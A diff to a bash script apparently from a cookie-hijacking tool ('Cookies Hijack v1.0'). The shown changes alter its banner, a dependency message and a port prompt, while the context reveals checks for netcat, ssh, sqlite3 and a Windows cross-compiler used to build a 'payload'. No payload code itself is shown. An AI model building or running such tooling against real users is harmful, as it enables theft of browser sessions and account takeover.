@@ -9,13 +9,18 @@ trap 'printf "\n";stop' 2
 
 banner() {
 
-                                          
+printf "\e[1;77m   ____      _    ____            _    _            \n"
+printf "  / ___| ___| |_ / ___|___   ___ | | _(_) ___  ___  \n"
+printf " | |  _ / _ \ __| |   / _ \ / _ \| |/ / |/ _ \/ __| \n"
+printf " | |_| |  __/ |_| |__| (_) | (_) |   <| |  __/\__ \ \n"
+printf "  \____|\___|\__|\____\___/ \___/|_|\_\_|\___||___/\e[0m \n"
+                                                                                             
 printf "\n"
-printf "\e[1;77m        .:.:\e[0m\e[1;93m Cookie Hijack \e[0m\e[1;77m:.:.\e[0m\n"                              
-printf "\e[1;93m        .:.:\e[0m\e[1;92m Coded by:\e[0m\e[1;77m@linux_choice\e[0m \e[1;93m:.:.\e[0m\n"
+printf "\e[1;77m            .:.:\e[0m\e[1;93m Cookies Hijack v1.0 \e[0m\e[1;77m:.:.\e[0m\n"                              
+printf "\e[1;93m         .:.:\e[0m\e[1;92m Coded by: \e[0m\e[1;77m @linux_choice\e[0m \e[1;93m:.:.\e[0m\n"
 printf "\n"
-printf "     \e[101m:: Warning: Attacking targets without  ::\e[0m\n"
-printf "     \e[101m:: prior mutual consent is illegal!    ::\e[0m\n"
+printf "     \e[101m::  Warning: Attacking targets without  ::\e[0m\n"
+printf "     \e[101m::  prior mutual consent is illegal!    ::\e[0m\n"
 printf "\n"
 
 }
@@ -39,7 +44,7 @@ dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 command -v sqlite3 > /dev/null 2>&1 || { echo >&2 "I require sqlite3 but it's not installed. Install it. Aborting."; exit 1; } 
-command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: \"apt-get install mingw-w64\" .Aborting."; 
+command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: \"apt-get install mingw-w64 or bash install.sh\" .Aborting."; 
 exit 1; }
 command -v nc > /dev/null 2>&1 || { echo >&2 "I require Netcat but it's not installed. Install it. Aborting."; 
 exit 1; }
@@ -169,7 +174,7 @@ rm -rf Log.log
 default_port=$(seq 1111 4444 | sort -R | head -n1)
 default_port2=$(seq 1111 4444 | sort -R | head -n1)
 default_port3=$(seq 1111 4444 | sort -R | head -n1)
-printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Random:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
 default_payload_name="payload"
